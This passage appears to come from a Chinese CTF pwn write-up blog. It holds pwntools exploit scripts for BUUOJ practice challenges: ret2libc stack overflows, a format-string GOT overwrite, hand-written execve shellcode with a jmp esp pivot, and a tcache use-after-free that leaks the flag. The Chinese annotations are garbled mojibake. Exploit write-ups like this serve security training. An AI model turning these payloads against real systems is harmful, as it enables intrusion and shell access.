class="string">&#x27;&lt;I&#x27;</span>, <span class="number">0x0806cc25</span>) <span class="comment"># int 0x80</span></span><br><span class="line">    sl(p)</span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">28408</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">pau   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print &#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="axb-2019-brop64"><a href="#axb-2019-brop64" class="headerlink" title="axb_2019_brop64"></a>axb_2019_brop64</h2><p>ï¼ˆæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ ˆæº¢å‡º</li><li>ret2libc</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;axb_2019_brop64&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;../libc-2.23.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Please tell me:&quot;</span>)</span><br><span class="line">    pop_rdi_ret = <span class="number">0x0000000000400963</span></span><br><span class="line">    func = <span class="number">0x400845</span></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(pop_rdi_ret) + p64(elf.got[<span class="string">&quot;read&quot;</span>]) + p64(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p64(func)</span><br><span class="line">    sd(payload)</span><br><span class="line">    leak = uu64(ru(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]) - libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;libc base:&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    libc.address = leak</span><br><span class="line">    echo(<span class="string">&quot;/bin/sh:&quot;</span> + <span class="built_in">hex</span>(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()))</span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xD8</span> + p64(pop_rdi_ret) + p64(libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()) + p64(libc.sym[<span class="string">&quot;system&quot;</span>]) + p64(<span class="number">0xdeadbeef</span>) </span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">29520</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdba</span>():</span></span><br><span class="line">    <span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    cmd =<span class="string">&#x27;set follow-fork-mode parent\n&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> pie:</span><br><span class="line">        base = <span class="built_in">int</span>(os.popen(<span class="string">&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print axb_2019_brop64&#125;&#125;&#x27;&quot;</span>.<span class="built_in">format</span>(io.pid)).readlines()[<span class="number">1</span>],<span class="number">16</span>)</span><br><span class="line">        cmd +=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b+base) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">        cmd +=<span class="string">&#x27;set base=&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(base)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cmd+=<span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="built_in">format</span>(b) <span class="keyword">for</span> b <span class="keyword">in</span> bps])</span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a>wdb_2018_2nd_easyfmt</h2><p>ï¼ˆæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>å¾ªç¯32ä½æ ¼å¼åŒ–å­—ç¬¦ä¸²</li></ul><p>pwntoolsä¸€æŠŠæ¢­</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./wdb_2018_2nd_easyfmt.1&quot;</span></span><br><span class="line"><span class="comment"># libc_path = &#x27;/glibc/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span></span><br><span class="line">libc_path = <span class="string">&quot;../libc-2.23_32.so&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;Do you know repeater?&quot;</span>)</span><br><span class="line">    sd(<span class="string">&quot;%35$p&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">    leak = <span class="built_in">int</span>(re(<span class="number">8</span>, <span class="number">0</span>), base = <span class="number">16</span>) - <span class="number">247</span> - libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">    echo(<span class="string">&quot;leakï¼š&quot;</span> + <span class="built_in">hex</span>(leak))</span><br><span class="line">    payload = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&quot;printf&quot;</span>]:leak + libc.sym[<span class="string">&quot;system&quot;</span>]&#125;)</span><br><span class="line">    sd(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge,env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:libc_path&#125;)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">27749</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">bps = []</span><br><span class="line">pie = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="x-ctf-b0verfl0w"><a href="#x-ctf-b0verfl0w" class="headerlink" title="x_ctf_b0verfl0w"></a>x_ctf_b0verfl0w</h2><p>ï¼ˆè¾ƒæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ‰‹å†™shellcode</li><li>æ ˆæº¢å‡º</li></ul><p>æœ‰ä¸ªhintå‡½æ•°ï¼Œé‡Œé¢æœ‰æ¡jmp espæŒ‡ä»¤</p><p>æ ˆç©ºé—´å¤ªå°ï¼Œéœ€è¦æ‰‹å†™shellcodeï¼Œç„¶åretåœ°å€æ”¹ä¸ºjmp espçš„gadgetï¼ˆå¼€RWXäº†ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">32</span></span><br><span class="line">challenge = <span class="string">&quot;./b0verfl0w&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">    shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    xor edx,edx</span></span><br><span class="line"><span class="string">    push edx</span></span><br><span class="line"><span class="string">    push 0x68732f2f</span></span><br><span class="line"><span class="string">    push 0x6e69622f</span></span><br><span class="line"><span class="string">    mov ebx,esp</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    mov al,0xB</span></span><br><span class="line"><span class="string">    int 0x80</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line">    payload = asm(shellcode)</span><br><span class="line">    echo(<span class="built_in">str</span>(<span class="built_in">len</span>(payload)))</span><br><span class="line">    payload = payload.ljust(<span class="number">0x24</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    payload += p32(<span class="number">0x8048504</span>) + asm(<span class="string">&quot;sub esp,0x28;jmp esp&quot;</span>)</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26603</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="cmcc-pwnme1"><a href="#cmcc-pwnme1" class="headerlink" title="cmcc_pwnme1"></a>cmcc_pwnme1</h2><p>ï¼ˆæ˜“ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ ˆæº¢å‡ºï¼Œret2libc</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./pwnme1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    ru(<span class="string">&quot;&gt;&gt; 6. Exit&quot;</span>)</span><br><span class="line">    sl(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;Please input the name of fruit:&quot;</span>)</span><br><span class="line">    payload = <span class="number">0xA8</span> * <span class="string">b&#x27;a&#x27;</span> + p32(elf.plt[<span class="string">&quot;puts&quot;</span>]) + p32(<span class="number">0x08048624</span>) + p32(elf.got[<span class="string">&quot;puts&quot;</span>])</span><br><span class="line">    sl(payload)</span><br><span class="line">    libc = ELF(<span class="string">&quot;../libc-2.23_32.so&quot;</span>)</span><br><span class="line">    leak = uu32(ru(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:]) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">    payload = <span class="number">0xA8</span> * <span class="string">b&#x27;a&#x27;</span> + p32(leak + libc.sym[<span class="string">&quot;system&quot;</span>]) + p32(<span class="number">0x08048624</span>) + p32(leak + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__())</span><br><span class="line">    sl(payload)</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = process(challenge)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>, <span class="number">26780</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> arch == <span class="number">64</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> arch == <span class="number">32</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p   = <span class="keyword">lambda</span>      : pause() </span><br><span class="line">s   = <span class="keyword">lambda</span> x    : success(x)</span><br><span class="line">re  = <span class="keyword">lambda</span> m, t : io.recv(numb=m, timeout=t)</span><br><span class="line">ru  = <span class="keyword">lambda</span> x    : io.recvuntil(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>      : io.recvline()</span><br><span class="line">sd  = <span class="keyword">lambda</span> x    : io.send(x)</span><br><span class="line">sl  = <span class="keyword">lambda</span> x    : io.sendline(x)</span><br><span class="line">ia  = <span class="keyword">lambda</span>      : io.interactive()</span><br><span class="line">sla = <span class="keyword">lambda</span> a, b : io.sendlineafter(a, b)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a, b : io.sendafter(a, b)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line">ia()</span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-final-2"><a href="#ciscn-2019-final-2" class="headerlink" title="ciscn_2019_final_2"></a>ciscn_2019_final_2</h2><p>ï¼ˆéš¾ï¼‰è€ƒç‚¹ï¼š</p><ul><li>æ–‡ä»¶æè¿°ç¬¦</li><li>uaf</li></ul><p>æ€»ç»“ï¼šdup2å‡½æ•°ï¼Œä¿®æ”¹<em>IO_2_1_stdin</em>ç»“æ„ä½“ä¸­çš„æ–‡ä»¶æè¿°ç¬¦å­—æ®µï¼ˆè¾“å…¥ä¸º0ï¼Œé…åˆdup2å‡½æ•°æ³„éœ²flagæ–‡ä»¶ï¼‰ï¼Œæ—§ç‰ˆlibc2.27æ— editçš„uafï¼Œbssæ²¡æœ‰heaparrayåªæœ‰heapptrçš„æ—¶å€™ç”¨uafä¸€å—tcacheï¼Œç„¶åæ”¹nextæŒ‡é’ˆæ¥åšå¤„ç†ï¼Œè™½ç„¶æ²¡editä½†æ˜¯å¯ä»¥addåæ”¹ï¼ˆæœ¬èº«æŒ‡å‘çš„å°±æ˜¯è‡ªå·±ï¼‰</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">arch =  <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&quot;./ciscn_final_2&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;/glibc/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">echo</span>(<span class="params">content</span>):</span></span><br><span class="line">    print(<span class="string">&quot;\033[4;36;40mOutput prompts:\033[0m&quot;</span> + <span class="string">&quot;\t\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + content + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    add(<span class="number">2</span>,<span class="number">0x20</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">1</span>,<span class="number">0x30</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line">    chunk = show(<span class="number">2</span>) - <span class="number">0xa0</span></span><br><span class="line">    add(<span class="number">2</span>, chunk)</span><br><span class="line">    add(<span class="number">2</span>, chunk)</span><br><span class="line">    add(<span class="number">2</span>, <span class="number">0x91</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, <span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    stdin_fileno = ((show(<span class="number">1</span>) - <span class="number">96</span> - <span class="number">0x10</span>) &amp; <span class="number">0xffff</span>) - (libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>] - libc.sym[<span class="string">&quot;_IO_2_1_stdin_&quot;</span>]) + <span class="number">0x70</span></span><br><span class="line">    echo(<span class="built_in">hex</span>(stdin_fileno))</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">        free(<span class="number">1</span>)</span><br><span class="line">        add(<span class="number">2</span>, stdin_fileno)</span><br><span class="line">    chunk = show(<span class="number">1</span>) + <span class="number">0x30</span></span><br><span class="line">    add(<span class="number">1</span>, chunk)</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    add(<span class="number">1</span>, stdin_fileno)</span><br><span class="line">    add(<span class="number">1</span>, <span class="number">666</span>)</span><br><span class="line">    edit(<span class="string">&quot;flagå‡ºæ¥å§&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">local = <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])</span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    io = 